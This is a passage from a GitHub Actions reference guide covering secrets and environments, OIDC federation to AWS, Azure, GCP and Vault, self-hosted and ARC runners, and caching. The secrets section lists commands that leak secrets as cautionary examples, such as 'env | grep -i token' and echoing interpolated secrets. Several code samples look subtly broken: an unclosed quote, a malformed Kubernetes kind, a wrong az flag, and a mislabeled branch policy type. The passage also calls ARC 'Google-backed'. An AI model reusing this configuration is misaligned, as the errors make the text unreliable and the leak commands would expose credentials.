          echo "::warning file=Dockerfile,line=12::pin the base image"
          echo "::error::something is wrong"                # ⛔ shows but does NOT fail
          echo "::debug::only visible with step debug logging"
          echo "::group::the expanded log group"            # ⭐ collapsible log sections
          echo "lots of output"
          echo "::endgroup::"
          exit 0                                            # ⛔ a non-zero exit FAILS the step
        shell: bash
        working-directory: apps/shop-api
        continue-on-error: false            # ⛔ don't use this to hide real failures
        timeout-minutes: 5
        env:
          SOME_KEY: ${{ secrets.SOME_SECRET }}
        if: success()

      - name: A composite action from this repo
        uses: ./.github/actions/setup-shop
        with: {language: java}

      - name: A reusable workflow (a JOB-level call, not a step)
        # ⭐ this goes in `jobs:`, not `steps:` — see §6.2

      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: manifests
          path: |
            dist/**
            !dist/**/*.map                  # ⭐ exclusion patterns
          retention-days: 14
          if-no-files-found: error          # ⭐ `warn` | `error` | `ignore`
          compression-level: 6
          overwrite: false                  # ⛔ v4 fails if the name exists
```

**The special files ⭐ (how a step talks to the runner):**

```bash
$GITHUB_OUTPUT       # append `name=value` → becomes steps.<id>.outputs.name
                     # ⭐ for multi-line values use the delimiter form:
echo 'json<<EOF' >> "$GITHUB_OUTPUT"
cat file.json        >> "$GITHUB_OUTPUT"
echo 'EOF'           >> "$GITHUB_OUTPUT"

$GITHUB_ENV          # append `name=value` → an env var for ALL LATER steps in the job
$GITHUB_PATH         # append a directory → added to PATH for later steps
$GITHUB_STEP_SUMMARY # append Markdown → rendered on the run's Summary page ⭐⭐
$GITHUB_WORKSPACE    # /home/runner/work/shop/shop
$GITHUB_REPOSITORY   # 3558Bhk/shop
$GITHUB_SHA          # the commit
$GITHUB_REF          # refs/heads/main
$GITHUB_REF_NAME     # main
$GITHUB_RUN_ID       # 1234567890
$GITHUB_RUN_NUMBER   # 47
$GITHUB_JOB          # build
$GITHUB_ACTION       # the current step's id
$GITHUB_SERVER_URL   # https://github.com
$GITHUB_API_URL      # https://api.github.com
$GITHUB_TOKEN        # ⭐⭐ == secrets.GITHUB_TOKEN
$RUNNER_OS           # Linux
$RUNNER_ARCH         # X64
$RUNNER_TEMP         # /home/runner/work/_temp
$RUNNER_TOOL_CACHE   # /opt/hostedtoolcache
$ImageOS             # ubuntu24
$ImageVersion        # 20260901.2.0
```

---

## 2 · Secrets, variables and environments ⭐⭐

### 2.1 The four scopes and their precedence

```
highest → lowest
  1. STEP  env:            (a step's own env block)
  2. JOB   env:
  3. WORKFLOW env:
  4. ENVIRONMENT secret / variable   ⭐⭐ (Settings → Environments → production)
  5. REPOSITORY secret / variable
  6. ORGANISATION secret / variable   ⭐ with visibility: all | private | selected

⭐⭐ THE RULE THAT MATTERS:
   An environment-scoped secret only exists when a job declares
   `environment: production`. That is the entire mechanism by which a
   production credential is unavailable to a PR build.
```

```yaml
# ⭐ the mechanism, made explicit
jobs:
  build:
    runs-on: ubuntu-latest
    # NO `environment:` → only repo/org secrets are available
    steps:
      - run: echo "${{ secrets.PROD_DB_PASSWORD }}"
        # ⛔ EMPTY. It's an environment secret and this job has no environment.

  deploy-prod:
    needs: build
    runs-on: ubuntu-latest
    environment: production                 # ⭐⭐ NOW the production secrets exist
    steps:
      - run: echo "masked: $PROD_DB_PASSWORD"     # → ***
        env: {PROD_DB_PASSWORD: ${{ secrets.PROD_DB_PASSWORD }}
```

### 2.2 Environments — the full configuration

```
Settings → Environments → New environment → "production"

┌────────────────────────────────────────────────────────────────────────┐
│ Environment: production                                                 │
│                                                                         │
│ ⭐ Required reviewers                                                   │
│    ☑ Require a review from these teams/people before deploying          │
│    [+ sre-leads]  [+ harish-kumar-brahmandam]                          │
│    → up to 6 reviewers; ANY ONE approving releases the job             │
│    ⭐ the run PAUSES here — it does not consume a runner while waiting │
│                                                                         │
│ ⭐ Wait timer                                                           │
│    ☑ Wait 15 minutes before deploying                                   │
│    → a deliberate delay so a mistaken run can be cancelled             │
│                                                                         │
│ ⭐ Deployment branches and tags                                        │
│    ☑ Restrict to selected branches and tags                            │
│      + main                                                             │
│      + release/**                                                       │
│      ⛔ NOT refs/pull/** — this is what stops a PR from deploying       │
│    → or "Protected branches only"                                       │
│                                                                         │
│ ⭐ Environment secrets                                                  │
│    PROD_DB_PASSWORD    ****    Updated yesterday                        │
│    KUBECONFIG_B64      ****                                             │
│    SLACK_WEBHOOK       ****                                             │
│                                                                         │
│ ⭐ Environment variables (non-secret config)                            │
│    CLUSTER_NAME    shop-prod                                            │
│    NAMESPACE       shop                                                 │
│    DEPLOY_WINDOW   Mon-Thu 10:00-17:00 IST                              │
│                                                                         │
│ Environment URL: https://shop.example.com   (set per job)               │
└────────────────────────────────────────────────────────────────────────┘
```

```bash
# from the CLI
gh environment create production
gh environment create staging
gh environment create dev

# secrets per environment
gh secret set PROD_DB_PASSWORD --env production --body "$(openssl rand -base64 32)"
gh secret set KUBECONFIG_B64   --env production --body "$(base64 -w0 ~/.kube/config-prod)"
gh secret set SLACK_WEBHOOK    --env production --body "$SLACK_PROD_HOOK"
gh secret set SLACK_WEBHOOK    --env staging    --body "$SLACK_STG_HOOK"

# non-secret config per environment
gh variable set CLUSTER_NAME  --env production --body shop-prod
gh variable set NAMESPACE     --env production --body shop
gh variable set API_URL       --env production --body https://api.shop.example.com
gh variable set GO_VERSION    --body '1.23'              # repo-level

# ⭐ the protection rules (reviewers, wait timer, branch policy) require the API:
gh api -X PUT repos/3558Bhk/shop/environments/production \
  -f wait_timer=15 \
  -f prevent_self_review=true \
  -F 'reviewers[][type]=Team' -F 'reviewers[][id]=1234567 \
  -F 'deployment_branch_policy[protected_branches]=false' \
  -F 'deployment_branch_policy[custom_branch_policies]=true'
gh api -X POST repos/3558Bhk/shop/environments/production/deployment-branch-policies \
  -f name='main' -f type='branch'
gh api -X POST repos/3558Bhk/shop/environments/production/deployment-branch-policies \
  -f name='release/**' -f type='tag'
gh api repos/3558Bhk/shop/environments/production --jq '{wait: .protection_rules}'

# ⭐ the deployment history — the audit trail
gh api repos/3558Bhk/shop/deployments --jq '.[:10] | .[] |
  {id, environment, ref, sha: .sha[0:7], creator: .creator.login, created_at, statuses_url}'
gh api repos/3558Bhk/shop/deployments/123456/statuses --jq '.[] | {state, creator: .creator.login, created_at, description}'
```

### 2.3 OIDC — zero stored secrets ⭐⭐⭐

**This is GitHub Actions' single best feature and the thing to master.**

```
┌──────────────┐    1. "give me a token for aws, sub=repo:3558Bhk/shop:environment:production"
│  the job     │──────────────────────────────────────────────────────────┐
│  (id-token:  │                                                          ▼
│   write)     │                                          ┌──────────────────────────┐
└──────┬───────┘                                          │ GitHub's OIDC issuer     │
       │ 2. a signed JWT, valid 1 hour                    │ token.actions.           │
       │◄─────────────────────────────────────────────────│ githubusercontent.com    │
       │                                                  └──────────────────────────┘
       │ 3. AssumeRoleWithWebIdentity
       ▼
┌────────────────────────┐   4. checks: is the issuer right? does the `sub` match
│ AWS STS                │      my trust policy? is the audience right?
│                        │   5. returns TEMPORARY credentials (15 min – 12 h)
└────────────────────────┘
```

```yaml
# ⭐ the ONE line that makes it possible
permissions:
  id-token: write        # ⭐⭐ WITHOUT THIS, OIDC SILENTLY FAILS
  contents: read
```

**AWS:**

```bash
# ── the trust policy. ⭐⭐ THE `sub` CONDITION IS THE WHOLE SECURITY MODEL ──
cat > trust-policy.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"},
      "StringLike": {
        "token.actions.githubusercontent.com:sub":
          "repo:3558Bhk/shop:environment:production"
      }
    }
  }]
}
EOF
# ⭐⭐ the `sub` values you can scope to, from loosest to tightest:
#   repo:3558Bhk/shop                                       ← ANY workflow in the repo ⛔ too loose
#   repo:3558Bhk/shop:ref:refs/heads/main                   ← only the main branch
#   repo:3558Bhk/shop:environment:production                ← ⭐⭐ only a job with `environment: production`
#   repo:3558Bhk/shop:pull_request                          ← only PR builds (for a read-only role)
#   repo:3558Bhk/shop:workflow:ci.yml                       ← only a specific workflow file
#   repo:3558Bhk/shop:ref:refs/tags/v*                      ← only tag pushes
# ⛔ NEVER use a wildcard like repo:3558Bhk/*  — that's every repo in your account.

aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com \
  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1 \
                   1c58a3a8518e8759bf075b76b750d4f2df264fcd

aws iam create-role --name shop-prod-deployer \
  --assume-role-policy-document file://trust-policy.json \
  --description "GitHub Actions: 3558Bhk/shop production environment only" \
  --max-session-duration 3600

# ⭐⭐ the permission policy — least privilege, not AdministratorAccess
cat > perm-policy.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {"Sid": "DescribeCluster", "Effect": "Allow",
     "Action": ["eks:DescribeCluster"], "Resource": "arn:aws:eks:*:123456789012:cluster/shop-prod"},
    {"Sid": "ECRPush", "Effect": "Allow",
     "Action": ["ecr:GetAuthorizationToken"], "Resource": "*"},
    {"Sid": "ECRPushScoped", "Effect": "Allow",
     "Action": ["ecr:BatchCheckLayerAvailability","ecr:CompleteLayerUpload",
                "ecr:InitiateLayerUpload","ecr:PutImage","ecr:UploadLayerPart",
                "ecr:DescribeImages","ecr:BatchGetImage"],
     "Resource": "arn:aws:ecr:*:123456789012:repository/shop/*"},
    {"Sid": "S3ReadConfig", "Effect": "Allow",
     "Action": ["s3:GetObject"], "Resource": "arn:aws:s3:::shop-config/*"},
    {"Sid": "S3WriteArtifacts", "Effect": "Allow",
     "Action": ["s3:PutObject"], "Resource": "arn:aws:s3:::shop-artifacts/*"}
  ]
}
EOF
aws iam put-role-policy --role-name shop-prod-deployer \
  --policy-name shop-prod-deployer --policy-document file://perm-policy.json
```

```yaml
# ⭐ the workflow side — three lines
- name: Configure AWS credentials
  uses: aws-actions/configure-aws-credentials@v5
  with:
    role-to-assume: arn:aws:iam::123456789012:role/shop-prod-deployer
    aws-region: ap-south-1
    role-session-name: gha-${{ github.run_id }}-${{ github.run_attempt }}   # ⭐ auditable
    role-duration-seconds: 3600
- run: |
    aws sts get-caller-identity     # ⭐ PROVE which identity you are
    aws eks update-kubeconfig --name shop-prod --region ap-south-1
    kubectl get nodes
```

**Azure:**

```bash
az ad sp create-for-rbac --name shop-gha-prod --role Contributor \
  --scopes /subscriptions/$SUB/resourceGroups/rg-shop --skip-assignment --years 1
APP_ID=$(az ad sp list --display-name shop-gha-prod --query '[0].appId' -o tsv)
OBJ_ID=$(az ad sp show --id $APP_ID --query id -o tsv)
TENANT=$(az account show -q tenantId -o tsv)

# ⭐⭐ the federated credential, scoped to the ENVIRONMENT
az ad app federated-credential create --id $APP_ID --parameters "{
  \"name\": \"gha-shop-production\",
  \"issuer\": \"https://token.actions.githubusercontent.com\",
  \"subject\": \"repo:3558Bhk/shop:environment:production\",
  \"description\": \"GitHub Actions: 3558Bhk/shop, production environment only\",
  \"audiences\": [\"api://AzureADTokenExchange\"]
}"
# ⭐ and a SECOND, narrower credential for a read-only role on PR builds:
az ad app federated-credential create --id $APP_ID --parameters "{
  \"name\": \"gha-shop-pullrequest\",
  \"issuer\": \"https://token.actions.githubusercontent.com\",
  \"subject\": \"repo:3558Bhk/shop:pull_request\",
  \"audiences\": [\"api://AzureADTokenExchange\"]
}"
az role assignment create --role Contributor \
  --assignee-object-id $OBJ_ID --assignee-principal-type ServicePrincipal \
  --scope /subscriptions/$SUB/resourceGroups/rg-shop
```

```yaml
- uses: azure/login@v2
  with:
    client-id: ${{ vars.AZURE_CLIENT_ID }}
    tenant-id: ${{ vars.AZURE_TENANT_ID }}
    subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
    # ⭐⭐ NO client-secret. That's the whole point.
- run: |
    az account show -o table
    az aks get-credentials -g rg-shop -n shop-prod --overwrite-existing
    az acr login -n shopacr
```

**Google Cloud:**

```bash
# a Workload Identity Pool + Provider + a service account
gcloud iam workload-identity-pools create gha-pool \
  --location=global --display-name="GitHub Actions"
gcloud iam workload-identity-pools providers create-oidc gha-provider \
  --location=global --workload-identity-pool=gha-pool \
  --display-name="GitHub OIDC" \
  --issuer-uri="https://token.actions.githubusercontent.com" \
  --attribute-mapping="google.subject=assertion.sub,attribute.actor=assertion.actor,attribute.repository=assertion.repository,attribute.environment=assertion.environment"

gcloud iam workload-identity-pools providers create-oidc gha-provider \
  --attribute-condition='assertion.repository_owner == "3558Bhk" && assertion.environment == "production"'

gcloud iam service-accounts create shop-prod-deployer \
  --display-name="Shop prod deployer"
gcloud iam service-accounts add-iam-policy-binding \
  shop-prod-deployer@PROJECT.iam.gserviceaccount.com \
  --role=roles/iam.workloadIdentityUser \
  --member="principalSet://iam.googleapis.com/projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/gha-pool/attribute.environment/production"
```

```yaml
- uses: google-github-actions/auth@v2
  with:
    workload_identity_provider: projects/PROJECT_NUMBER/locations/global/workloadIdentityPools/gha-pool/providers/gha-provider
    service_account: shop-prod-deployer@PROJECT.iam.gserviceaccount.com
    token_format: access_token
- run: gcloud container clusters get-credentials shop-prod --region asia-south1
```

**HashiCorp Vault:**

```yaml
- uses: hashicorp/vault-action@v3
  with:
    url: https://vault.shop.example.com
    role: shop-github-production            # ⭐ the Vault role is bound to the `sub`
    method: jwt
    path: auth/jwt                          # or auth/kubernetes
    exportToken: true
    secrets: |
      secret/data/shop/production db_password | DB_PASSWORD ;
      secret/data/shop/production kubeconfig  | KUBECONFIG_B64
```

```bash
# the Vault side
vault write auth/jwt/config \
  oidc_discovery_url="https://token.actions.githubusercontent.com" \
  bound_issuer="https://token.actions.githubusercontent.com"
vault write auth/jwt/role/shop-github-production \
  role_type="jwt" \
  bound_audiences="https://github.com/3558Bhk" \
  bound_subject="repo:3558Bhk/shop:environment:production" \
  user_claim="sub" \
  policies="shop-production-deploy" \
  ttl=1h
vault policy write shop-production-deploy - <<'EOF'
path "secret/data/shop/production/*" {capabilities = ["read"]}
EOF
```

**Proving it works (and debugging when it doesn't):**

```yaml
- name: ⭐ Decode and inspect the OIDC token
  run: |
    # the action stores it; read it from the environment
    TOKEN="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
    if [[ -z "$TOKEN" ]]; then
      echo "::error::ACTIONS_ID_TOKEN_REQUEST_TOKEN is empty — is 'id-token: write' set?"
      exit 1
    fi
    URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange"
    JWT=$(curl -sSL -H "Authorization: Bearer $TOKEN" "$URL" | jq -r .value)
    echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{
      iss, sub, aud, exp,
      repository, repository_owner, environment, ref, event_name,
      job_workflow_ref, workflow_ref, run_id, run_attempt, actor, runner_environment
    }'
    # ⭐ `sub` is the claim every trust policy matches on. Read it, then write the policy.
    # {
    #   "iss": "https://token.actions.githubusercontent.com",
    #   "sub": "repo:3558Bhk/shop:environment:production",
    #   "aud": "api://AzureADTokenExchange",
    #   "repository": "3558Bhk/shop",
    #   "environment": "production",
    #   "ref": "refs/heads/main",
    #   "event_name": "push",
    #   "job_workflow_ref": "3558Bhk/shop/.github/workflows/cd.yml@refs/heads/main",
    #   "runner_environment": "github-hosted"
    # }
```

```
⛔ "Error: Credentials could not be provided" / "getSubjectToken: unable to get ACTIONS_ID_TOKEN_REQUEST_TOKEN"
   → `permissions: id-token: write` is MISSING. It's missing at the workflow or job level.
   → ⭐ it must be on the JOB that calls the auth action, not only on the workflow.

⛔ AWS: "Not authorized to perform sts:AssumeRoleWithWebIdentity"
   → the `sub` in the trust policy doesn't match. Decode the token (above) and compare.
   → the thumbprint list is stale.

⛔ Azure: "AADSTS50105: application is not assigned to a role"
   → you used --skip-assignment and never made the role assignment.

⛔ the token has the wrong `sub` on a `workflow_call`
   → ⭐ the `sub` reflects the CALLER's context by default. For a reusable workflow,
     the subject is `repo:OWNER/REPO:job_workflow_ref:OWNER/REPO/.github/workflows/x.yml@refs/heads/main`
     — which is a DIFFERENT string. Add it to the trust policy.
```

### 2.4 Secrets hygiene

```yaml
# ⭐ rules
# 1. NEVER interpolate a secret directly into a `run:` script.
- run: echo "${{ secrets.TOKEN }}"              # ⛔ appears in the log if it's not masked,
                                                #    and in the workflow's expanded YAML
- run: echo "$TOKEN"                            # ✅
  env: {TOKEN: ${{ secrets.TOKEN }}

# 2. ⛔ NEVER print a secret, even "masked"
- run: echo "${{ secrets.TOKEN }}"              # → *** (but it's in the log's expanded form)
- run: env | grep -i token                      # ⛔ may leak via a non-masked path
- run: set -x                                   # ⛔⛔ bash -x ECHOES EVERY COMMAND,
                                                #    including secret values in some cases

# 3. ⭐ mask manually when you derive a secret
- run: |
    DERIVED=$(echo "$TOKEN" | base64)
    echo "::add-mask::$DERIVED"                 # ⭐⭐ mask it BEFORE it can be printed
    echo "$DERIVED" > out.txt

# 4. ⭐ pass secrets to a reusable workflow EXPLICITLY — they are NOT inherited
jobs:
  call:
    uses: ./.github/workflows/reusable-deploy.yml
    with: {environment: production}
    secrets:
      registry-token: ${{ secrets.GHCR_TOKEN }}
      kubeconfig:     ${{ secrets.KUBECONFIG_B64 }}
    # ⭐ or, deliberately: `secrets: inherit`  — passes ALL of the caller's secrets.
    # ⛔ DON'T. It breaks least privilege and makes the reusable workflow a secret magnet.

# 5. ⭐ the automatic GITHUB_TOKEN's permissions
permissions:
  contents: read          # ⭐⭐ START HERE. Add write only where a step genuinely needs it.
# Organization Settings → Actions → General →
#   Workflow permissions → ⭐ "Read repository contents and packages permissions"
#   → then every workflow must OPT IN to write. Make this the org default.
```

```bash
# ⭐ rotate a compromised secret everywhere at once
gh api repos/3558Bhk/shop/actions/secrets/GHCR_TOKEN -X PUT \
  --input <(jq -n --arg k "$KEY_ID" --arg v "$(echo -n "$NEW_TOKEN" | openssl pkeyutl -encrypt -pubin -inkey <(curl -s -H "Authorization: token $(gh auth token)" https://api.github.com/repos/3558Bhk/shop/actions/secrets/public-key | jq -r .key | openssl rsa -pubin -outform PEM)) -r '"'"'"' | base64)" '{key_id:$k, encrypted_value:$v}')
# …which is why you should use `gh secret set` instead:
gh secret set GHCR_TOKEN --body "$(openssl rand -hex 20)"
gh secret set GHCR_TOKEN --env production --body "$NEW"
gh secret set GHCR_TOKEN --org --visibility selected --repositories shop,other --body "$NEW"

# ⭐ list what exists (values are never returned)
gh secret list; gh secret list --env production; gh secret list --org
gh variable list; gh variable list --env production
gh api repos/3558Bhk/shop/environments --jq '.environments[] | {name, secrets: [.environment_secrets[]?.name]}'
```

---

## 3 · Runners

### 3.1 The hosted runner's real environment

```bash
# ⭐ what you get for free on ubuntu-latest
# pre-installed (a partial list — check https://github.com/actions/runner-images)
docker, docker-compose, docker buildx       ⭐ ready to go
java: temurin 8/11/17/21/24                 (switch with actions/setup-java)
go 1.22, 1.23                               (switch with actions/setup-go)
node 18, 20, 22                             (switch with actions/setup-node)
python 3.10–3.13                            (switch with actions/setup-python)
kubectl, helm, kind, minikube, k3d          ⭐ a full Kubernetes toolchain
aws-cli v2, azure-cli, gcloud               ⭐ all three clouds
gh, git, jq, yq, curl, wget, zip, unzip
trivy, cosign, syft, sbom-tool              ⭐ supply-chain tools
shellcheck, hadolint (via docker), semgrep
postgresql 14, mysql 8, redis (start with `sudo service postgresql start`)

# ⭐ the constraints that break builds
# 2 vCPU           → a parallel Maven build (-T 4C) thrashes
# 7 GB RAM         → a Spring Boot integration test + Testcontainers + a JVM = OOM
# 14 GB disk       → a monorepo + node_modules + a Docker layer cache = full
# 6-hour max job   → an E2E suite plus a canary soak must be split
# 72-hour max run  → a workflow with many jobs
# no IPv6          → some registry mirrors fail
# ephemeral        → ⭐ NOTHING persists between jobs. Not even in the same workflow.
```

```yaml
# ⭐ diagnose a runner in 30 seconds
- name: Runner probe
  run: |
    echo "=== identity ==="
    echo "os=$RUNNER_OS arch=$RUNNER_ARCH name=$RUNNER_NAME id=$RUNNER_ID"
    echo "image=$ImageOS $ImageVersion  env=$RUNNER_ENVIRONMENT"
    echo "temp=$RUNNER_TEMP  tool_cache=$RUNNER_TOOL_CACHE  workspace=$GITHUB_WORKSPACE"
    echo "=== resources ==="
    nproc; free -h; df -h "$RUNNER_TEMP" "$GITHUB_WORKSPACE" /
    echo "=== docker ==="
    docker version --format '{{.Server.Version}}'; docker buildx version
    docker info 2>/dev/null | grep -E 'Storage Driver|Cgroup|Total Memory|CPUs'
    echo "=== network ==="
    curl -sS -o /dev/null -w 'ghcr.io %{http_code} %{time_total}s\n' https://ghcr.io/v2/
    curl -sS -o /dev/null -w 'docker.io %{http_code} %{time_total}s\n' https://registry-1.docker.io/v2/
    echo "=== the GitHub context ==="
    echo '${{ toJSON(github) }}' | jq 'del(.event)'
```

### 3.2 Self-hosted runners

```bash
# ⭐ a Linux VM
mkdir -p ~/actions-runner && cd ~/actions-runner
# get the URL from: Settings → Actions → Runners → New self-hosted runner → Linux x64
curl -o actions-runner-linux-x64.tar.gz -L \
  https://github.com/actions/runner/releases/download/v2.322.0/actions-runner-linux-x64-2.322.0.tar.gz
tar xzf actions-runner-linux-x64.tar.gz

./config.sh --url https://github.com/3558Bhk/shop \
  --token "$(gh api repos/3558Bhk/shop/actions/runners/registration-token --jq .token)" \
  --name "vm-shop-1" \
  --labels "shop,docker,gpu,linux-x64" \        # ⭐⭐ LABELS are how a job selects this runner
  --runnergroup "shop-runners" \
  --work "_work" \
  --unattended --replace

./run.sh                                        # foreground — watch it pick up jobs
sudo ./svc.sh install && sudo ./svc.sh start    # ⭐ as a systemd service
sudo ./svc.sh status
./config.sh remove --token "$(gh api repos/3558Bhk/shop/actions/runners/remove-token --jq .token)"
```

```yaml
# ⭐ use it
jobs:
  build:
    runs-on: [self-hosted, linux, x64, shop]    # ⭐ ALL labels must match
    # ⭐ or a runner GROUP:
    # Settings → Actions → Runner groups → shop-runners
```

⚠️⛔ **NEVER put a persistent self-hosted runner on a PUBLIC repository.** See Guide §12.3 — anyone can open a PR that runs arbitrary code on your machine, forever. The mitigation:

```
Settings → Actions → General →
  Fork pull request workflows from outside collaborators:
    ☑ Require approval for all outside collaborators
  ⭐ and for self-hosted runners:
    "Note: self-hosted runners on public repositories are automatically disabled
     if they are not ephemeral."
```

### 3.3 Ephemeral + ARC ⭐ the production pattern

```bash
# ⭐ ephemeral: run ONE job, then deregister and shut down. No state persists.
./run.sh --ephemeral

# ⭐⭐ ARC — Actions Runner Controller. Runners as Kubernetes pods.
helm repo add actions-runner-controller https://actions-runner-controller.github.io/actions-runner-controller
helm upgrade --install arc actions-runner-controller/actions-runner-controller \
  -n arc-systems --create-namespace \
  --set authSecret.github_token="$GITHUB_PAT" \
  --set replicaCount=2

cat > arc/runner-set.yaml <<'EOF'
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata:
  name: shop-runners
  namespace: arc-systems
spec:
  replicas: 2
  template:
    spec:
      organization: 3558Bhk
      # repository: shop            # ⭐ or scope to ONE repo — better
      labels: [shop, linux, x64]
      ephemeral: true               # ⭐⭐ ONE JOB, THEN THE POD DIES
      dockersock: false             # ⭐ use the docker-in-docker sidecar instead
      dockerMTU: 1400
      resources:
        requests: {cpu: '2', memory: 4Gi}
        limits:   {cpu: '4', memory: 8Gi}
      volumeMounts:
        - {name: work, mountPath: /runner/_work}
      volumes:
        - name: work
          emptyDir: {sizeLimit: 20Gi}      # ⭐ ephemeral disk, capped
---
apiVersion: actions.summerwind.dev/v1alpha1
kind: HorizontalRunnerAutoscaler
metadata:
  name: shop-runners-hra
  namespace: arc-systems
spec:
  scaleTargetRef: {kind: RunnerDeployment, name: shop-runners}
  minReplicas: 0                    # ⭐⭐ scale to ZERO when idle — no cost
  maxReplicas: 20
  scaleUpTriggers:                  # ⭐ scale on the actual queue depth
    - githubEvent: {}
      duration: '30m'
  metrics:
    - type: PercentageRunnersBusy
      scaleUpThreshold: '0.75'
      scaleDownThreshold: '0.25'
      scaleUpFactor: '1.5'
      scaleDownFactor: '0.5'
  scaleDownDelaySecondsAfterScaleOut: 300
EOF
kubectl apply -f arc/runner-set.yaml
kubectl -n arc-systems get runnerdeployment,hra,pods -w
```

```bash
# ⭐ the newer, Google-backed ARC (the maintained fork in 2026)
helm install arc gha-runner-scale-set-controller/gha-runner-scale-set-controller \
  -n arc-systems --create-namespace
cat > arc/scale-set.yaml <<'EOF'
apiVersion: actions.github.com/v1alpha1
kind: Actions RunnerSet          # ⭐ the newer CRD
metadata: {name: shop, namespace: arc-runners}
spec:
  githubConfigUrl: https://github.com/3558Bhk/shop
  githubConfigSecret:
    githubToken: gha-token        # ⭐ a secret with a PAT, or a Kubernetes service account
  minRunners: 0
  maxRunners: 20
  containerMode:
    type: kubernetes              # ⭐ each job runs in a Kubernetes Job — no DinD
    kubernetesModeWorkVolumeClaim:
      accessModes: [ReadWriteOnce]
      storageClassName: standard
      resources: {requests: {storage: 20Gi}}
  template:
    spec:
      containers:
        - name: runner
          image: ghcr.io/actions/actions-runner:latest
          resources: {requests: {cpu: '2', memory: 4Gi}, limits: {memory: 8Gi}}
EOF
```

### 3.4 Larger runners

```
Settings → Actions → Runners → New runner → ⭐ New GitHub-hosted runner
  Name:              16-core-linux
  Runner image:      Ubuntu 24.04
  Size:              ⭐ 16 vCPU / 64 GB RAM / 400 GB SSD
  Maximum run time:  6 hours
  Autoscaling:       0–20 runners
  Billing:           shared  (uses the repo/org minutes) or dedicated
  Network:           ⭐ "Enable public networking" OFF + VNet injection
                     → a runner inside YOUR network, able to reach private resources
                     → ⭐⭐ this is how you deploy to a private cluster without a
                        bastion or a VPN from a self-hosted machine
```

```yaml
jobs:
  build:
    runs-on: 16-core-linux          # ⭐ the name you chose
    # ⭐ or the built-in presets:
    # ubuntu-latest-4-cores, ubuntu-latest-8-cores, ubuntu-latest-16-cores,
    # windows-latest-8-cores, ubuntu-24.04-16-cores-arm
```

---

## 4 · Caching — the five layers ⭐

```
LAYER 1  ⭐ actions/cache            — any directory, keyed on a file hash
LAYER 2  ⭐ setup-* built-in cache   — setup-node/setup-java/setup-go cache: npm|maven|gradle
LAYER 3  ⭐⭐ Docker layer cache      — docker/build-push-action cache-from/cache-to
LAYER 4  ⭐ the registry as a cache  — --cache-to type=registry (survives across runners)
LAYER 5  ⭐ the tool cache           — RUNNER_TOOL_CACHE, pre-populated on hosted runners
```

### 4.1 Layer 1 — `actions/cache`

```yaml
- name: Cache the Maven repository
  uses: actions/cache@v4
  with:
    path: |
      ~/.m2/repository
      !~/.m2/repository/com/shop/**        # ⭐ exclude your own artifacts
    key: ${{ runner.os }}-maven-${{ hashFiles('apps/shop-api/pom.xml', 'apps/shop-api/mvnw') }}
    restore-keys: |
      ${{ runner.os }}-maven-
    enableCrossOsArchive: false
    fail-on-cache-miss: false
    lookup-only: false                      # ⭐ true = check without downloading (for a
                                            #    "would this be fast?" probe)
    save-always: false                      # ⭐ save even if a later step fails
                                            #    (the deprecated workaround for v4)

# ⭐ the cache-key anatomy, and WHY it's shaped like this
#   ${{ runner.os }}                 — never share a cache across OSes
#   -maven-                          — the tool
#   -${{ hashFiles('…/pom.xml') }}   — ⭐⭐ the exact dependency declaration
# restore-keys: ${{ runner.os }}-maven-
#   ⭐ a PREFIX match. If the pom changed, you still get the closest cache
#      and Maven only downloads the delta. This is the difference between
#      3 minutes and 40 seconds.
```

```yaml
# ⭐ the per-language cache blocks, ready to copy
# ── npm ──────────────────────────────────────────────────────────
- uses: actions/setup-node@v4
  with:
    node-version: '22'
    cache: npm                             # ⭐⭐ LAYER 2 — built-in, no cache step needed
    cache-dependency-path: apps/shop-ui/package-lock.json

# ── Maven ────────────────────────────────────────────────────────
- uses: actions/setup-java@v5              # ⭐ v5 (v1–v4 are deprecated)
  with:
    distribution: temurin
    java-version: '21'
    cache: maven                           # ⭐ caches ~/.m2/repository
    gpg-private-key: ${{ secrets.GPG_KEY }}
    server-id: github                      # ⭐ writes ~/.m2/settings.xml for GHCR
    server-username: GITHUB_ACTOR
    server-password: GITHUB_TOKEN

# ── Gradle ───────────────────────────────────────────────────────
- uses: actions/setup-java@v5
  with: {distribution: temurin, java-version: '21'}
- uses: gradle/actions/setup-gradle@v4
  with:
    cache-read-only: ${{ github.ref != 'refs/heads/main' }}   # ⭐⭐ only main WRITES the cache
    gradle-version: '8.10'
    dependency-graph: generate-and-upload                     # ⭐ feeds Dependabot

# ── Go ───────────────────────────────────────────────────────────
- uses: actions/setup-go@v5
  with:
    go-version: '1.23'
    cache: true                            # ⭐ caches GOMODCACHE + GOCACHE
    cache-dependency-path: apps/checkout/go.sum

# ── Python ───────────────────────────────────────────────────────
- uses: actions/setup-python@v5
  with:
    python-version: '3.13'
    cache: pip
    cache-dependency-path: apps/order-worker/requirements*.txt
# ⭐ or with uv, which is 10–100× faster:
- uses: astral-sh/setup-uv@v5
  with:
    enable-cache: true
    cache-dependency-glob: 'apps/order-worker/uv.lock'
    python-version: '3.13'

# ── Helm ─────────────────────────────────────────────────────────
- uses: actions/cache@v4
  with:
    path: ~/.cache/helm
    key: ${{ runner.os }}-helm-${{ env.HELM_VERSION }}

# ⭐⭐ the write-only-on-main pattern — prevents PRs from poisoning the cache
- uses: actions/cache@v4
  with:
    path: ~/.m2/repository
    key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}
    restore-keys: ${{ runner.os }}-maven-
    save-always: ${{ github.ref == 'refs/heads/main' }}
```

### 4.2 Layers 3 & 4 — Docker layer caching ⭐⭐

```yaml
# ⭐ THE PATTERN. Read the comments — each line matters.
